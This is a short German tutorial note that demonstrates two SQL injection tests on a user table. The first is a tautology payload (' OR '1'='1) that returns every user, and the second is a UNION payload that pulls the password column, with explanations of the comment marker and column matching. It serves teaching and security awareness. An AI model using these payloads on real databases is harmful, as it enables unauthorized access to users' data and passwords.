1. Test
Um z.B. alle Datensätze bei einer ungesicherten Datenbankverbindung auszulesen, kann man vesuchen folgendes einzugeben:
' OR '1'='1

Aus der SQL - Abfrage wird dann:

SELECT id, username, email FROM benutzer WHERE username = '' OR '1'='1'

Die Bedingung `OR '1'='1'` ist immer wahr. Dadurch werden alle Benutzer ausgegeben!


2. Test
Um weitere Spalten (z.B. Passwörter) angezeigt zu bekommen, kann man mit UNION arbeiten:
' UNION SELECT id, username, passwort FROM benutzer -- '

Aus der SQL Abfrage wird dann:

SELECT id, username, email FROM benutzer WHERE username = '' UNION SELECT id, username, passwort FROM benutzer -- '


--> Die beiden Bindestriche am Ende (--) stehen für ein Kommentar und kommentieren somit das letzte Anführungszeichen (') aus!
    --> Ansonsten würde man einen SQL - Syntaxfehler erhalten
--> Die Anzahl der Spalten, die bei der Abfrage der Datensätze zurückgegeben werden, müssen exakt von Anzahl und Datentyp übereinstimmen!

ursprünglich:   id | username | email
Injection:      id | username | passwort    <-- SQL Injection!!!